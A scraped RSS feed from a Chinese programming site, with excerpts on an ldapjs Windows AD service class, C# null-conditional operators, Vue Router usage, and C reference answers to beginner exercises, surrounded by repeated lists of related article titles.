2024年即将到来&amp;#xff0c;作为一名大学生&amp;#xff0c;为了表达在新的一年里&amp;#xff0c;对祖国的祝福&amp;#xff0c;请编写程序输出祝福语&amp;#xff1a;在新的一年…阅读更多...【Linux】进程ID和线程ID在日志中的体现在分析内核打印日志流程的时候&amp;#xff0c;发现有时候同一个进程函数调用关系比较混乱&amp;#xff08;因为只打印了进程号&amp;#xff09;&amp;#xff0c;现象就是一个函数走着走着不知道走哪里去了。  
另一个现象是&amp;#xff0c;在Linux启动Firefox的时候&amp;#xff0c;启了大概80个进程&amp;…阅读更多...android11 usb摄像头添加多分辨率支持部分借鉴于&amp;#xff1a;https://blog.csdn.net/weixin_45639314/article/details/142210634 
目录 
一、需求介绍 
二、UVC介绍 
三、解析 
四、补丁修改 
1、预览的限制主要存在于hal层和framework层 
2、添加所需要的分辨率&amp;#xff1a; 
3、hal层修改 
4、frameworks 
5、备…阅读更多...视频美颜SDK与直播平台的融合：实现实时美颜的技术方案详解视频美颜SDK作为一种技术解决方案&amp;#xff0c;已经广泛应用于各类直播平台中&amp;#xff0c;实现了实时美颜效果的优化。那么&amp;#xff0c;视频美颜SDK是如何与直播平台融合&amp;#xff0c;打造高效的实时美颜效果的&amp;#xff1f;本文将对此技术方案进行详细解析。 
一、视频美颜SDK的核…阅读更多...滚雪球学Redis[6.2讲]：Redis脚本与Lua：深入掌握Redis中的高效编程技巧全文目录&amp;#xff1a; &amp;#x1f4dd;前言&amp;#x1f6a6;正文&amp;#x1f31f;6.2.1 Lua脚本的优势&amp;#x1f58b;️6.2.2 EVAL命令与Lua脚本编写&amp;#x1f435;编写Lua脚本的基本步骤&amp;#x1f436;示例&amp;#xff1a;简单的GET和SET操作&amp;#x1f431;示例&amp;#xff1a;Lua实现自增和过期…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:20 +0000</pubDate>
    </item>
    <item>
      <title>ToB项目身份认证AD集成（完）：利用ldap.js实现与windows AD对接实现用户搜索、认证、密码修改等功能 - 以及针对中文转义问题的补丁方法介绍</title>
      <link>https://www.ppmy.cn/news/1540379.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维ToB项目身份认证AD集成（完）：利用ldap.js实现与windows AD对接实现用户搜索、认证、密码修改等功能 - 以及针对中文转义问题的补丁方法介绍news/2025/10/31 17:53:19/在前面的两篇文章中，我详细的介绍了使用ldap与window AD服务集成，实现ToB项目中的身份认证集成方案，包括技术方案介绍、环境配置：ToB项目身份认证AD集成（一）：基于目录的用户管理、LDAP和Active Directory简述ToB项目身份认证AD集成（二）：一分钟搞定window server 2003部署AD域服务并支持ssl加密（多图保姆教程+证书脚本）在本文中，我将详细介绍如何利用ldapjs库使之一个 Node.js 服务类LdapService，该类实现了与 之前搭建的Windows AD 交互，包括用户搜索、身份验证、密码修改等功能。也算是AD集成系列的完结吧，后续可能出其它客户端的对接，但目前工作核心在AI那块儿，大概率也不会继续了一、实现方案和LdapService类概述LdapService类的核心是通过 LDAP（轻量级目录访问协议）与 AD 进行交互，提供用户搜索、认证、密码修改、重置等功能。下图是该类的基本结构，后续将一步步的介绍如何实现各个方法。classLdapService{client:Promise&lt;ldap.Client&gt;;privateconfig:MustProperty&lt;LdapServiceConfig&gt;;constructor(config:LdapServiceConfig){this.config={...defaultConfig,...config,};this.client=this.init();}asyncfindUsers(filter=this.config.userSearchFilter,attributes:string[]=["sAMAccountName","userPrincipalName","memberOf"]){}// 关闭连接asyncclose(){(awaitthis.client).destroy();}asyncfindUser(){}// 修改用户密码的方法asyncchangePassword(user:LdapUserSimInfo,newPassword:string,oldPassword:string){}// 用户认证的方法 - 检查密码是否正确asynccheckPassword(user:LdapUserSimInfo,password:string){}/*重置密码 */asyncresetPassword(user:LdapUserSimInfo,resetPassword:string){}privateasyncinit(){constconf=this.config;constclient=ldap.createClienhttp://www.ppmy.cn/news/1540379.html相关文章理解C#中空值条件运算符及空值检查简化前言 .NET 4.6 及以上版本，提供了空值条件运算符 ?. 和 ?[]。这些运算符的引入，为我们提供了一种简明的方式来处理空值的场景、简化空值检查，可避免 NullReferenceExceptions 的异常。本文将探索 C# 的空值检查运算符。 
介绍 空值，这里指的是 null。在定义对象后，未对其…阅读更多...深入了解Vue Router：基本用法、重定向、动态路由与路由守卫的性能优化文章目录 1. 引言2. Vue Router的基本用法2.1 基本配置 3. 重定向和命名路由的使用3.1 重定向3.2 命名路由 4. 在Vue Router中如何处理动态路由4.1 动态路由的概念4.2 如何处理动态路由4.3 动态路由的懒加载 5. 路由守卫的实现与性能影响5.1 什么是路由守卫&amp;#xff1f;5.2 路由…阅读更多...2024入门测参考答案（c语言版）先自己看代码思考&amp;#xff0c;不理解的地方可以截图私聊…… 
7-1 祝福祖国&amp;#xff01; 
这是一个编程题模板。 
2024年即将到来&amp;#xff0c;作为一名大学生&amp;#xff0c;为了表达在新的一年里&amp;#xff0c;对祖国的祝福&amp;#xff0c;请编写程序输出祝福语&amp;#xff1a;在新的一年…阅读更多...【Linux】进程ID和线程ID在日志中的体现在分析内核打印日志流程的时候&amp;#xff0c;发现有时候同一个进程函数调用关系比较混乱&amp;#xff08;因为只打印了进程号&amp;#xff09;&amp;#xff0c;现象就是一个函数走着走着不知道走哪里去了。  
另一个现象是&amp;#xff0c;在Linux启动Firefox的时候&amp;#xff0c;启了大概80个进程&amp;…阅读更多...android11 usb摄像头添加多分辨率支持部分借鉴于&amp;#xff1a;https://blog.csdn.net/weixin_45639314/article/details/142210634 
目录 
一、需求介绍 
二、UVC介绍 
三、解析 
四、补丁修改 
1、预览的限制主要存在于hal层和framework层 
2、添加所需要的分辨率&amp;#xff1a; 
3、hal层修改 
4、frameworks 
5、备…阅读更多...视频美颜SDK与直播平台的融合：实现实时美颜的技术方案详解视频美颜SDK作为一种技术解决方案&amp;#xff0c;已经广泛应用于各类直播平台中&amp;#xff0c;实现了实时美颜效果的优化。那么&amp;#xff0c;视频美颜SDK是如何与直播平台融合&amp;#xff0c;打造高效的实时美颜效果的&amp;#xff1f;本文将对此技术方案进行详细解析。 
一、视频美颜SDK的核…阅读更多...滚雪球学Redis[6.2讲]：Redis脚本与Lua：深入掌握Redis中的高效编程技巧全文目录&amp;#xff1a; &amp;#x1f4dd;前言&amp;#x1f6a6;正文&amp;#x1f31f;6.2.1 Lua脚本的优势&amp;#x1f58b;️6.2.2 EVAL命令与Lua脚本编写&amp;#x1f435;编写Lua脚本的基本步骤&amp;#x1f436;示例&amp;#xff1a;简单的GET和SET操作&amp;#x1f431;示例&amp;#xff1a;Lua实现自增和过期…阅读更多...FFMPEG录屏（19）--- 枚举Windows下的屏幕列表，并获取名称、缩略图在Windows下枚举显示器列表并获取名称、缩略图 
在Windows系统中&amp;#xff0c;枚举显示器列表并获取它们的名称和缩略图是一个常见的需求。本文将详细介绍如何实现这一功能&amp;#xff0c;涉及到的主要技术包括Windows API和C编程。 
获取显示器信息 
首先&amp;#xff0c;我们需要一个…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:19 +0000</pubDate>
    </item>
    <item>
      <title>理解C#中空值条件运算符及空值检查简化</title>
      <link>https://www.ppmy.cn/news/1540378.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维理解C#中空值条件运算符及空值检查简化news/2025/10/31 17:53:18/前言.NET 4.6 及以上版本，提供了空值条件运算符 ?. 和 ?[]。这些运算符的引入，为我们提供了一种简明的方式来处理空值的场景、简化空值检查，可避免 NullReferenceExceptions 的异常。本文将探索 C# 的空值检查运算符。介绍空值，这里指的是 null。在定义对象后，未对其声明或声明为 null。如下示例：// 场景一
string productName = null;
// 场景二
Student student;下面通过一些示例来一起探索 C# 的空值条件运算符的使用方法与场景。1、空值条件运算符 ?.空值条件运算符 ?. ，也称安全导航运算符。在我们使用它时，仅当对象非空时，它才允许您访问对象的成员。以下是它使用示例：namespace Fountain.WinConsole.OtherDemo
{public class Student{/// &lt;summary&gt;/// 名称/// &lt;/summary&gt;public string Name { get; set; }/// &lt;summary&gt;/// 年龄/// &lt;/summary&gt;public int Age { get; set; }/// &lt;summary&gt;/// 班级/// &lt;/summary&gt;public string Class { get; set; }}
}http://www.ppmy.cn/news/1540378.html相关文章深入了解Vue Router：基本用法、重定向、动态路由与路由守卫的性能优化文章目录 1. 引言2. Vue Router的基本用法2.1 基本配置 3. 重定向和命名路由的使用3.1 重定向3.2 命名路由 4. 在Vue Router中如何处理动态路由4.1 动态路由的概念4.2 如何处理动态路由4.3 动态路由的懒加载 5. 路由守卫的实现与性能影响5.1 什么是路由守卫&amp;#xff1f;5.2 路由…阅读更多...2024入门测参考答案（c语言版）先自己看代码思考&amp;#xff0c;不理解的地方可以截图私聊…… 
7-1 祝福祖国&amp;#xff01; 
这是一个编程题模板。 
2024年即将到来&amp;#xff0c;作为一名大学生&amp;#xff0c;为了表达在新的一年里&amp;#xff0c;对祖国的祝福&amp;#xff0c;请编写程序输出祝福语&amp;#xff1a;在新的一年…阅读更多...【Linux】进程ID和线程ID在日志中的体现在分析内核打印日志流程的时候&amp;#xff0c;发现有时候同一个进程函数调用关系比较混乱&amp;#xff08;因为只打印了进程号&amp;#xff09;&amp;#xff0c;现象就是一个函数走着走着不知道走哪里去了。  
另一个现象是&amp;#xff0c;在Linux启动Firefox的时候&amp;#xff0c;启了大概80个进程&amp;…阅读更多...android11 usb摄像头添加多分辨率支持部分借鉴于&amp;#xff1a;https://blog.csdn.net/weixin_45639314/article/details/142210634 
目录 
一、需求介绍 
二、UVC介绍 
三、解析 
四、补丁修改 
1、预览的限制主要存在于hal层和framework层 
2、添加所需要的分辨率&amp;#xff1a; 
3、hal层修改 
4、frameworks 
5、备…阅读更多...视频美颜SDK与直播平台的融合：实现实时美颜的技术方案详解视频美颜SDK作为一种技术解决方案&amp;#xff0c;已经广泛应用于各类直播平台中&amp;#xff0c;实现了实时美颜效果的优化。那么&amp;#xff0c;视频美颜SDK是如何与直播平台融合&amp;#xff0c;打造高效的实时美颜效果的&amp;#xff1f;本文将对此技术方案进行详细解析。 
一、视频美颜SDK的核…阅读更多...滚雪球学Redis[6.2讲]：Redis脚本与Lua：深入掌握Redis中的高效编程技巧全文目录&amp;#xff1a; &amp;#x1f4dd;前言&amp;#x1f6a6;正文&amp;#x1f31f;6.2.1 Lua脚本的优势&amp;#x1f58b;️6.2.2 EVAL命令与Lua脚本编写&amp;#x1f435;编写Lua脚本的基本步骤&amp;#x1f436;示例&amp;#xff1a;简单的GET和SET操作&amp;#x1f431;示例&amp;#xff1a;Lua实现自增和过期…阅读更多...FFMPEG录屏（19）--- 枚举Windows下的屏幕列表，并获取名称、缩略图在Windows下枚举显示器列表并获取名称、缩略图 
在Windows系统中&amp;#xff0c;枚举显示器列表并获取它们的名称和缩略图是一个常见的需求。本文将详细介绍如何实现这一功能&amp;#xff0c;涉及到的主要技术包括Windows API和C编程。 
获取显示器信息 
首先&amp;#xff0c;我们需要一个…阅读更多...【升华】python基础包NumPy学习NumPy是使用Python进行科学计算的基础软件包。除其他外&amp;#xff0c;它包括&amp;#xff1a; 
功能强大的N维数组对象。精密广播功能函数。集成 C/C和Fortran 代码的工具。强大的线性代数、傅立叶变换和随机数功能。 
# 1、安装包
$ pip install numpy# 2、进入python的交互式界面
$…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:18 +0000</pubDate>
    </item>
    <item>
      <title>深入了解Vue Router：基本用法、重定向、动态路由与路由守卫的性能优化</title>
      <link>https://www.ppmy.cn/news/1540377.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维深入了解Vue Router：基本用法、重定向、动态路由与路由守卫的性能优化news/2025/10/31 17:53:17/文章目录1. 引言2. Vue Router的基本用法2.1 基本配置3. 重定向和命名路由的使用3.1 重定向3.2 命名路由4. 在Vue Router中如何处理动态路由4.1 动态路由的概念4.2 如何处理动态路由4.3 动态路由的懒加载5. 路由守卫的实现与性能影响5.1 什么是路由守卫？5.2 路由守卫的类型5.3 性能影响与优化6. 结论1. 引言Vue Router是Vue.js官方的路由管理器，它为我们提供了在单页面应用程序（SPA）中切换页面的能力，并支持动态路由、重定向、命名路由等高级功能。本文将深入探讨Vue Router的基本用法、重定向和命名路由、动态路由的处理方式，以及路由守卫的实现与其对性能的影响。2. Vue Router的基本用法话题详细解释Vue Router的基本用法Vue Router用于管理应用中的页面导航，通过路由映射配置实现组件之间的切换。2.1 基本配置使用Vue Router的第一步是定义路由表，路由表是将URL路径映射到具体的组件。当用户访问某个路径时，Vue Router会加载与该路径对应的组件。基本示例：import{createRouter,createWebHistory}from'vue-router';importHomefrom'./components/Home.vue';importAboutfrom'./components/About.vue';constroutes=[{path:'/',component:Home},{path:'/about',component:About}];constrouter=createRouter({history:createWebHistory(),routes});exportdefaultrouter;在Vue实例中，通过&lt;router-view&gt;来渲染匹配的组件。&lt;template&gt;&lt;div&gt;&lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;&lt;/template&gt;3. 重定向和命名路由的使用话题详细解释重定向和命名路由的使用重定向可以将某个路径重定向到另一个路径，命名路由允许更直观地导航和管理路由。3.1 重定向在某些情况下，我们需要将用户从一个路径重定向到另一个路径。例如，当用户访问/home时，我们可以将其重定向到/。重定向示例：constroutes=[{path:'/home',redirect:'/'}];3.2 命名路由命名路由使得我们可以通过路由名称导航而不是路径字符串，这样在应用中可以更灵活地管理路由。命名路由示例：constroutes=[{path:'/about',name:'About',component:About}];// 通过名称导航router.push({name:'About'});命名路由的好处是，当路径发生变化时，只需要修改路由表中的路径，而不会影响整个项目中使用该路由的地方。4. 在Vue Router中如何处理动态路由话题详细解释处理动态路由动态路由允许我们使用参数生成路径，用于处理用户ID、文章ID等情况。4.1 动态路由的概念动态路由允许我们为某些路径定义参数。例如，路径/user/:id中的:id部分表示这是一个动态参数，任何匹配/user/123、/user/456等形式的URL都会将参数传递到路由组件中。动态路由示例：constroutes=[{path:'/user/:id',component:User}];在User组件中，可以通过this.$route.params.id获取该参数。4.2 如何处理动态路由处理动态路由时，Vue Router会根据匹配的路径自动传递参数。我们可以在组件中使用这些参数，例如根据用户ID获取用户详情。获取动态参数：exportdefault{created(){constuserId=this.$route.params.id;// 通过ID获取用户信息}};4.3 动态路由的懒加载为了优化性能，可以对动态路由进行懒加载，仅在访问该路由时才加载相关组件。动态懒加载示例：constroutes=[{path:'/user/:id',component:()=&gt;import('./components/User.vue')}];5. 路由守卫的实现与性能影响话题详细解释路由守卫的实现与性能影响路由守卫用于在路由跳转前后执行一些逻辑，可能会影响页面加载的速度，因此需要合理优化。5.1 什么是路由守卫？路由守卫是一系列钩子函数，用于在导航过程中执行某些操作，如用户身份验证、权限检查等。Vue Router提供了多种守卫，包括全局守卫、单个路由守卫、组件内守卫等。全局前置守卫：router.beforeEach((to,from,next)=&gt;{// 检查用户权限或身份认证if(to.meta.requiresAuth&amp;&amp;!isAuthenticated()){next({path:'/login'});}else{next();}});5.2 路由守卫的类型全局守卫：对所有路由都生效的守卫。路由独享守卫：针对单个路由的守卫，可以通过beforeEnter配置。组件内守卫：在具体组件内定义，用于控制组件加载前后的逻辑。5.3 性能影响与优化由于路由守卫会在每次导航时执行，频繁的复杂操作可能会影响页面的加载速度。为避免性能问题，我们可以采取以下优化措施：避免冗余检查：确保在守卫中只进行必要的检查，如缓存用户的认证状态，避免每次导航时重复请求后端验证。异步加载：使用next()之前处理异步操作时，可以让后端逻辑与前端导航并行进行。分离逻辑：将复杂的逻辑移到独立的服务或中间件中，减少守卫中的代码复杂度。6. 结论Vue Router为Vue.js应用提供了强大的路由功能，包括重定向、命名路由、动态路由和路由守卫。理解如何使用这些特性并进行合理的性能优化，对于构建高效的单页面应用至关重要。在实际应用中，合理使用路由守卫、优化动态路由的懒加载，并通过key和重定向机制提高可维护性，可以显著提升用户体验和开发效率。http://www.ppmy.cn/news/1540377.html相关文章2024入门测参考答案（c语言版）先自己看代码思考&amp;#xff0c;不理解的地方可以截图私聊…… 
7-1 祝福祖国&amp;#xff01; 
这是一个编程题模板。 
2024年即将到来&amp;#xff0c;作为一名大学生&amp;#xff0c;为了表达在新的一年里&amp;#xff0c;对祖国的祝福&amp;#xff0c;请编写程序输出祝福语&amp;#xff1a;在新的一年…阅读更多...【Linux】进程ID和线程ID在日志中的体现在分析内核打印日志流程的时候&amp;#xff0c;发现有时候同一个进程函数调用关系比较混乱&amp;#xff08;因为只打印了进程号&amp;#xff09;&amp;#xff0c;现象就是一个函数走着走着不知道走哪里去了。  
另一个现象是&amp;#xff0c;在Linux启动Firefox的时候&amp;#xff0c;启了大概80个进程&amp;…阅读更多...android11 usb摄像头添加多分辨率支持部分借鉴于&amp;#xff1a;https://blog.csdn.net/weixin_45639314/article/details/142210634 
目录 
一、需求介绍 
二、UVC介绍 
三、解析 
四、补丁修改 
1、预览的限制主要存在于hal层和framework层 
2、添加所需要的分辨率&amp;#xff1a; 
3、hal层修改 
4、frameworks 
5、备…阅读更多...视频美颜SDK与直播平台的融合：实现实时美颜的技术方案详解视频美颜SDK作为一种技术解决方案&amp;#xff0c;已经广泛应用于各类直播平台中&amp;#xff0c;实现了实时美颜效果的优化。那么&amp;#xff0c;视频美颜SDK是如何与直播平台融合&amp;#xff0c;打造高效的实时美颜效果的&amp;#xff1f;本文将对此技术方案进行详细解析。 
一、视频美颜SDK的核…阅读更多...滚雪球学Redis[6.2讲]：Redis脚本与Lua：深入掌握Redis中的高效编程技巧全文目录&amp;#xff1a; &amp;#x1f4dd;前言&amp;#x1f6a6;正文&amp;#x1f31f;6.2.1 Lua脚本的优势&amp;#x1f58b;️6.2.2 EVAL命令与Lua脚本编写&amp;#x1f435;编写Lua脚本的基本步骤&amp;#x1f436;示例&amp;#xff1a;简单的GET和SET操作&amp;#x1f431;示例&amp;#xff1a;Lua实现自增和过期…阅读更多...FFMPEG录屏（19）--- 枚举Windows下的屏幕列表，并获取名称、缩略图在Windows下枚举显示器列表并获取名称、缩略图 
在Windows系统中&amp;#xff0c;枚举显示器列表并获取它们的名称和缩略图是一个常见的需求。本文将详细介绍如何实现这一功能&amp;#xff0c;涉及到的主要技术包括Windows API和C编程。 
获取显示器信息 
首先&amp;#xff0c;我们需要一个…阅读更多...【升华】python基础包NumPy学习NumPy是使用Python进行科学计算的基础软件包。除其他外&amp;#xff0c;它包括&amp;#xff1a; 
功能强大的N维数组对象。精密广播功能函数。集成 C/C和Fortran 代码的工具。强大的线性代数、傅立叶变换和随机数功能。 
# 1、安装包
$ pip install numpy# 2、进入python的交互式界面
$…阅读更多...FFmpeg 4.3 音视频-多路H265监控录放C++开发四 ：RGB颜色一  RGB 的意义&amp;#xff1f; 为什么要从RGB 开始讲起呢&amp;#xff1f; 
因为最终传输到显卡显示器的颜色都是RGB 
即使能处理YUV的API&amp;#xff0c;本质上也是帮你做了从 YUV 到 RGB的转换。 RGB888 表示 R 占8bit&amp;#xff0c;G 占8bit&amp;#xff0c;B 占8bit&amp;#xff0c;也就是每一…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:17 +0000</pubDate>
    </item>
    <item>
      <title>2024入门测参考答案（c语言版）</title>
      <link>https://www.ppmy.cn/news/1540376.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维2024入门测参考答案（c语言版）news/2025/10/31 17:53:16/先自己看代码思考，不理解的地方可以截图私聊……7-1 祝福祖国！这是一个编程题模板。2024年即将到来，作为一名大学生，为了表达在新的一年里，对祖国的祝福，请编写程序输出祝福语：在新的一年里，愿祖国更加强大，国民更加幸福！输入格式:此题无输入。输出格式:在新的一年里，愿祖国更加强大，国民更加幸福！输入样例:输出样例:在新的一年里，愿祖国更加强大，国民更加幸福！参考答案：#include&lt;stdio.h&gt;
int main(){printf("在新的一年里，愿祖国更加强大，国民更加幸福！");
}7-2 宇宙无敌大招呼据说所有程序员学习的第一个程序都是在屏幕上输出一句“Hello World”，跟这个世界打个招呼。作为天梯赛中的程序员，你写的程序得高级一点，要能跟任意指定的星球打招呼。输入格式：输入在第一行给出一个星球的名字S，是一个由不超过7个英文字母组成的单词，以回车结束。输出格式：在一行中输出Hello S，跟输入的S星球打个招呼。输入样例：Mars输出样例：Hello Mars参考答案：#include&lt;stdio.h&gt;
int main(){char name[10];gets(name);printf("Hello ");for (int i = 0; name[i] != '\0'; i++) {printf("%c", name[i]);}
}7-3 2018我们要赢2018年天梯赛的注册邀请码是“2018wmyy”，意思就是“2018我们要赢”。本题就请你用汉语拼音输出这句话。输入格式：本题没有输入。输出格式：在第一行中输出：“2018”；第二行中输出：“wo3 men2 yao4 ying2 !”。输入样例：本题没有输入。输出样例：2018
wo3 men2 yao4 ying2 !参考答案：#include&lt;stdio.h&gt;
int main(){printf("2018\n");printf("wo3 men2 yao4 ying2 !");
}7-4 重要的话说三遍这道超级简单的题目没有任何输入。你只需要把这句很重要的话 —— “I'm gonna WIN!”——连续输出三遍就可以了。注意每遍占一行，除了每行的回车不能有任何多余字符。参考答案：#include&lt;stdio.h&gt;
int main(){for (int i = 0; i &lt; 3; i++) {printf("I'm gonna WIN!\n");}
}7-5 计算天数本题要求编写程序计算某年某月某日是该年中的第几天。输入格式:输入在一行中按照格式“yyyy/mm/dd”（即“年/月/日”）给出日期。注意：闰年的判别条件是该年年份能被4整除但不能被100整除、或者能被400整除。闰年的2月有29天。输出格式:在一行输出日期是该年中的第几天。输入样例1:2009/03/02输出样例1:61输入样例2:2000/03/02输出样例2:62参考答案：#include&lt;stdio.h&gt;
int common_year[] = {0,31,28,31,30,31,30,31,31,30,31,30,31};
int leap_year[] = {0,31,29,31,30,31,30,31,31,30,31,30,31};
int main(){int year,month,day;scanf("%d/%d/%d",&amp;year,&amp;month,&amp;day);int ans = 0;if (year%400 == 0 || (year%4 == 0 &amp;&amp; year%100 != 0)) {for (int i = 0; i &lt; month; i++) {ans += leap_year[i];}ans += day;}else {for (int i = 0; i &lt; month; i++) {ans += common_year[i];}ans += day;}printf("%d",ans);
}7-6 输出上半张九九乘法表请输出上半张九九乘法表，即下三角的半张。1*1= 1 1*2= 2 1*3= 3 1*4= 4 1*5= 5 1*6= 6 1*7= 7 1*8= 8 1*9= 9 2*2= 4 2*3= 6 2*4= 8 2*5=10 2*6=12 2*7=14 2*8=16 2*9=18 3*3= 9 3*4=12 3*5=15 3*6=18 3*7=21 3*8=24 3*9=27 ......8*8=64 8*9=72 9*9=81输入格式:无输出格式:按下面的格式输出，每个乘法结果值占2位（默认右对齐），其他数值仅占1位，每对之间一个空格隔开，最后一个也有空格，即每行结束后都有一空格，如1×9=9后有一空格再回车到第二行。注意：从第二行开始前面都有空格，提示每个乘法共占6位，一定要注意上下是对齐的。1*1= 1 1*2= 2 1*3= 3 1*4= 4 1*5= 5 1*6= 6 1*7= 7 1*8= 8 1*9= 9 2*2= 4 2*3= 6 2*4= 8 2*5=10 2*6=12 2*7=14 2*8=16 2*9=18 3*3= 9 3*4=12 3*5=15 3*6=18 3*7=21 3*8=24 3*9=27 ...... 7*7=49 7*8=56 7*9=63 8*8=64 8*9=72 9*9=81输入样例:无输出样例:1*1= 1 1*2= 2 1*3= 3 1*4= 4 1*5= 5 1*6= 6 1*7= 7 1*8= 8 1*9= 9 2*2= 4 2*3= 6 2*4= 8 2*5=10 2*6=12 2*7=14 2*8=16 2*9=18 3*3= 9 3*4=12 3*5=15 3*6=18 3*7=21 3*8=24 3*9=27 4*4=16 4*5=20 4*6=24 4*7=28 4*8=32 4*9=36 5*5=25 5*6=30 5*7=35 5*8=40 5*9=45 6*6=36 6*7=42 6*8=48 6*9=54 7*7=49 7*8=56 7*9=63 8*8=64 8*9=72 9*9=81参考答案：#include&lt;stdio.h&gt;
int main(){for (int i = 1; i &lt;= 9; i++) {int blank_num = (i-1)*7;for (int j = 0; j &lt; blank_num; j++) {printf(" ");}for (int j = i; j &lt;= 9; j++) {printf("%d*%d=%2d ",i,j,i*j);}printf("\n");}
}7-7 加法口诀表请编写程序，输出 n+n 的加法口诀表。样例输入5样例输出1+1= 2 2+1= 3 3+1= 4 4+1= 5 5+1= 6
1+2= 3 2+2= 4 3+2= 5 4+2= 6 5+2= 7
1+3= 4 2+3= 5 3+3= 6 4+3= 7 5+3= 8
1+4= 5 2+4= 6 3+4= 7 4+4= 8 5+4= 9
1+5= 6 2+5= 7 3+5= 8 4+5= 9 5+5=10注：和的域宽2格(右对齐)；两列之间空1格；行末没有空格。参考答案：#include&lt;stdio.h&gt;
int main(){int n;scanf("%d",&amp;n);for (int i = 1; i &lt;= n; i++) {for (int j = 1; j &lt;= n; j++) {if (j &gt; 1) printf(" ");printf("%d+%d=%2d",j,i,j+i);}printf("\n");}
